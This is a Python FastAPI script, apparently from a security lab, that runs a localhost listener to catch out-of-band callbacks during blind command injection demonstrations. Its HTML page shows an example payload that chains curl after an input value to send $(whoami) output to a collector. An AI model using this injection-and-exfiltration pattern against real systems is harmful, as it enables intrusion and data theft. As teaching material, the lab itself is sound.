"""
OOB callback listener for blind command injection demonstrations.

Run locally only:
    python host/oob_listener.py
"""

from datetime import datetime, timezone

import uvicorn
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse

app = FastAPI(title="OS Command Injection – OOB Listener")
EVENTS = []
MAX_EVENTS = 100


def _append_event(event: dict) -> None:
    EVENTS.insert(0, event)
    del EVENTS[MAX_EVENTS:]


@app.get("/", response_class=HTMLResponse)
def index():
    rows = []
    for item in EVENTS:
        rows.append(
            "<tr>"
            f"<td>{item['time']}</td>"
            f"<td>{item['path']}</td>"
            f"<td>{item['query']}</td>"
            f"<td>{item['source']}</td>"
            "</tr>"
        )

    table_rows = "".join(rows) if rows else "<tr><td colspan='4'>No callbacks yet.</td></tr>"
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>OOB Callback Listener</title>
  <style>
    body {{
      font-family: 'Segoe UI', system-ui, sans-serif;
      background: #0d1117;
      color: #c9d1d9;
      margin: 0;
      padding: 2rem 1rem;
    }}
    .wrap {{
      max-width: 1000px;
      margin: 0 auto;
    }}
    .card {{
      background: #161b22;
      border: 1px solid #30363d;
      border-radius: 10px;
      padding: 1rem 1.25rem;
      margin-bottom: 1rem;
    }}
    h1 {{
      margin: 0 0 0.5rem 0;
      color: #f0f6fc;
    }}
    table {{
      width: 100%;
      border-collapse: collapse;
      font-size: 0.9rem;
    }}
    th, td {{
      border-bottom: 1px solid #21262d;
      text-align: left;
      padding: 0.5rem 0.6rem;
      vertical-align: top;
      word-break: break-word;
    }}
    th {{
      color: #8b949e;
    }}
    code {{
      background: #0d1117;
      border: 1px solid #30363d;
      border-radius: 4px;
      padding: 0.1rem 0.35rem;
    }}
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card">
      <h1>OOB Callback Listener</h1>
      <p>Listening on <code>http://127.0.0.1:9000/collect</code>.</p>
      <p>Example blind payload:</p>
      <code>127.0.0.1; curl "http://127.0.0.1:9000/collect?proof=$(whoami)"</code>
    </div>
    <div class="card">
      <h2>Recent callbacks</h2>
      <table>
        <thead>
          <tr><th>Time (UTC)</th><th>Path</th><th>Query</th><th>Source</th></tr>
        </thead>
        <tbody>{table_rows}</tbody>
      </table>
    </div>
  </div>
</body>
</html>
"""


@app.get("/collect")
def collect(request: Request):
    _append_event(
        {
            "time": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S"),
            "path": str(request.url.path),
            "query": str(request.url.query) or "-",
            "source": request.client.host if request.client else "unknown",
        }
    )
    return JSONResponse({"status": "ok", "message": "callback recorded"})


@app.post("/reset")
def reset():
    EVENTS.clear()
    return JSONResponse({"status": "ok", "message": "events cleared"})


if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=9000)
